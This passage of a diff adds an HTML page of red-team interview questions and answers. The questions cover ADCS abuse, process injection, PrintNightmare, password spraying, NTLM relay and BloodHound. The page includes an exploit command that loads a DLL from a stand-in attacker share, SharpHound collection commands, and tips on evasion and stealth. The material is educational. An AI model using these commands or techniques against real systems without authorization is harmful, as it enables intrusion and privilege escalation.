+                    <p><strong>Tools:</strong></p>
+                    <ul>
+                        <li><strong>Certify:</strong> Find and abuse vulnerable templates</li>
+                        <li><strong>Certipy:</strong> Python ADCS attack tool</li>
+                        <li><strong>ForgeCert:</strong> Forge certificates with stolen CA key</li>
+                    </ul>
+                    <p><strong>Impact:</strong> Domain persistence, user impersonation, privilege escalation</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 23 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q23</span>
+                <span class="question-text">What is process injection and what techniques exist?</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Process Injection</strong> executes code in the address space of another process to evade detection and gain privileges.</p>
+                    <p><strong>Common techniques:</strong></p>
+                    <ul>
+                        <li><strong>Classic DLL Injection:</strong> VirtualAllocEx + WriteProcessMemory + CreateRemoteThread</li>
+                        <li><strong>Reflective DLL Injection:</strong> Load DLL from memory without touching disk</li>
+                        <li><strong>Process Hollowing:</strong> Create suspended process, unmap memory, inject payload</li>
+                        <li><strong>Thread Hijacking:</strong> Suspend thread, modify context, resume</li>
+                        <li><strong>APC Injection:</strong> Queue async procedure call to thread</li>
+                        <li><strong>Atom Bombing:</strong> Use atom tables for code storage</li>
+                        <li><strong>Process Doppelganging:</strong> Use NTFS transactions</li>
+                        <li><strong>Module Stomping:</strong> Overwrite legitimate module in memory</li>
+                    </ul>
+                    <p><strong>Target selection:</strong> Long-running processes, signed/trusted processes, processes with network access</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 24 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q24</span>
+                <span class="question-text">How do you handle detection during an engagement?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>When detected:</strong></p>
+                    <ol>
+                        <li><strong>Assess the situation:</strong>
+                            <ul>
+                                <li>What was detected? Tool, technique, or infrastructure?</li>
+                                <li>Active response or just logging?</li>
+                                <li>Scope of detection</li>
+                            </ul>
+                        </li>
+                        <li><strong>Decision points:</strong>
+                            <ul>
+                                <li>Continue engagement with different TTPs</li>
+                                <li>Pause and regroup</li>
+                                <li>Communicate with client POC</li>
+                            </ul>
+                        </li>
+                        <li><strong>Adaptation:</strong>
+                            <ul>
+                                <li>Switch C2 channels</li>
+                                <li>Change tools/techniques</li>
+                                <li>Rotate infrastructure</li>
+                                <li>Modify operational tempo</li>
+                            </ul>
+                        </li>
+                    </ol>
+                    <p><strong>Documentation:</strong> Record what triggered detection for reporting - this is valuable feedback for the client</p>
+                    <p><strong>Rules of Engagement:</strong> Follow agreed procedures for detection scenarios</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 25 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q25</span>
+                <span class="question-text">What is PrintNightmare and how is it exploited?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>PrintNightmare (CVE-2021-34527)</strong> is a critical vulnerability in Windows Print Spooler service allowing remote code execution or local privilege escalation.</p>
+                    <p><strong>Variants:</strong></p>
+                    <ul>
+                        <li><strong>CVE-2021-1675:</strong> LPE via AddPrinterDriverEx</li>
+                        <li><strong>CVE-2021-34527:</strong> RCE via remote spooler</li>
+                    </ul>
+                    <p><strong>Exploitation:</strong></p>
+                    <ol>
+                        <li>Host malicious DLL on SMB share</li>
+                        <li>Call AddPrinterDriverEx with UNC path to DLL</li>
+                        <li>Spooler service loads DLL as SYSTEM</li>
+                    </ol>
+                    <p><strong>Tools:</strong></p>
+                    <pre><code># Impacket
+python3 CVE-2021-1675.py domain/user:password@target '\\attacker\share\evil.dll'</code></pre>
+                    <p><strong>Mitigations:</strong> Disable Print Spooler, apply patches, restrict driver installation</p>
+                    <p><strong>Note:</strong> Still commonly found due to patching challenges with print infrastructure</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 26 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q26</span>
+                <span class="question-text">How do you perform password spraying attacks?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Password Spraying</strong> attempts a single password against many accounts to avoid account lockouts.</p>
+                    <p><strong>Methodology:</strong></p>
+                    <ol>
+                        <li><strong>Enumerate users:</strong> LDAP, OWA, LinkedIn, company website</li>
+                        <li><strong>Check password policy:</strong> Lockout threshold, reset time</li>
+                        <li><strong>Build password list:</strong> Season+Year, Company+123, Welcome1</li>
+                        <li><strong>Spray carefully:</strong> One password per lockout window</li>
+                        <li><strong>Monitor for success/lockouts</strong></li>
+                    </ol>
+                    <p><strong>Targets:</strong></p>
+                    <ul>
+                        <li>OWA/Office 365</li>
+                        <li>VPN endpoints</li>
+                        <li>SMB/AD directly</li>
+                        <li>LDAP</li>
+                    </ul>
+                    <p><strong>Tools:</strong> Spray, Ruler, SprayingToolkit, CrackMapExec</p>
+                    <p><strong>OPSEC:</strong> Use low and slow approach, distribute across IPs, match normal login patterns</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 27 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q27</span>
+                <span class="question-text">What is NTLM relay and when can it be used?</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>NTLM Relay</strong> forwards NTLM authentication attempts to another service, authenticating as the victim.</p>
+                    <p><strong>Requirements:</strong></p>
+                    <ul>
+                        <li>Target must not require signing (SMB signing, LDAP signing)</li>
+                        <li>Cannot relay to same machine (by default)</li>
+                        <li>Victim must authenticate to attacker</li>
+                    </ul>
+                    <p><strong>Coercion techniques:</strong></p>
+                    <ul>
+                        <li>PetitPotam (MS-EFSRPC)</li>
+                        <li>PrinterBug (MS-RPRN)</li>
+                        <li>DFSCoerce</li>
+                        <li>WebDAV</li>
+                        <li>Malicious files (SCF, URL, LNK)</li>
+                    </ul>
+                    <p><strong>Relay targets:</strong></p>
+                    <ul>
+                        <li>SMB to SMB (execute code)</li>
+                        <li>HTTP to LDAP (modify AD objects)</li>
+                        <li>HTTP to ADCS (request certificates)</li>
+                    </ul>
+                    <p><strong>Tools:</strong> ntlmrelayx.py (Impacket), Responder</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 28 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q28</span>
+                <span class="question-text">How do you maintain access after an engagement ends?</span>
+                <span class="difficulty-badge difficulty-easy">Easy</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Important clarification:</strong> Maintaining unauthorized access after an engagement is ILLEGAL and unethical. This question tests your understanding of adversary persistence for defensive purposes.</p>
+                    <p><strong>What red teamers document (for defense):</strong></p>
+                    <ul>
+                        <li>All persistence mechanisms installed</li>
+                        <li>All credentials obtained</li>
+                        <li>All backdoors placed</li>
+                        <li>All accounts created</li>
+                    </ul>
+                    <p><strong>Post-engagement requirements:</strong></p>
+                    <ul>
+                        <li>Remove ALL persistence mechanisms</li>
+                        <li>Delete created accounts</li>
+                        <li>Remove dropped files/tools</li>
+                        <li>Document everything for client remediation</li>
+                        <li>Provide cleanup verification</li>
+                    </ul>
+                    <p><strong>Correct answer:</strong> You DON'T maintain access. The engagement ends, all access is removed, and documentation is provided for the client to verify cleanup.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 29 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q29</span>
+                <span class="question-text">What is BloodHound and how do you use it effectively?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>BloodHound</strong> is a graph-based Active Directory analysis tool that identifies attack paths using relationship data.</p>
+                    <p><strong>Data collection (SharpHound):</strong></p>
+                    <pre><code>SharpHound.exe -c All,GPOLocalGroup
+# Or specific:
+SharpHound.exe -c DCOnly  # Less noisy</code></pre>
+                    <p><strong>Key queries:</strong></p>
+                    <ul>
+                        <li>Shortest path to Domain Admin</li>
+                        <li>Find Kerberoastable users</li>
+                        <li>Computers with unconstrained delegation</li>
+                        <li>Users with DCSync rights</li>
+                        <li>Shortest path from owned principal</li>
+                    </ul>
+                    <p><strong>Custom queries:</strong> Learn Cypher for advanced analysis</p>
+                    <p><strong>OPSEC considerations:</strong></p>
+                    <ul>
+                        <li>Full collection is noisy (many LDAP queries)</li>
+                        <li>Session collection creates network traffic</li>
+                        <li>Consider DCOnly for stealth</li>
+                        <li>Run from memory, avoid disk write</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 30 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q30</span>
+                <span class="question-text">Describe a complex attack chain you've executed during an engagement.</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>How to answer this question:</strong></p>
+                    <p>Demonstrate your ability to chain multiple techniques into a coherent operation. Structure:</p>
+                    <ol>
+                        <li><strong>Initial Access:</strong> How you got in (phishing, external service, physical)</li>
+                        <li><strong>Execution & Evasion:</strong> How you ran tools while avoiding detection</li>
+                        <li><strong>Discovery:</strong> What enumeration revealed the path forward</li>
+                        <li><strong>Privilege Escalation:</strong> How you elevated access</li>
+                        <li><strong>Lateral Movement:</strong> How you moved through the environment</li>
+                        <li><strong>Objective Completion:</strong> How you achieved the goal</li>
+                    </ol>
+                    <p><strong>Good example elements:</strong></p>
+                    <ul>
+                        <li>Multiple technique chaining</li>
+                        <li>Adaptation when blocked</li>
+                        <li>OPSEC considerations</li>
+                        <li>Creative problem-solving</li>
+                        <li>Clear communication of business impact</li>
+                    </ul>
+                    <p><strong>Tip:</strong> Prepare 2-3 examples showcasing different skills (AD attacks, cloud, social engineering paths)</p>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 SecInterview. Built by security professionals, for security professionals.</p>
+        </div>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
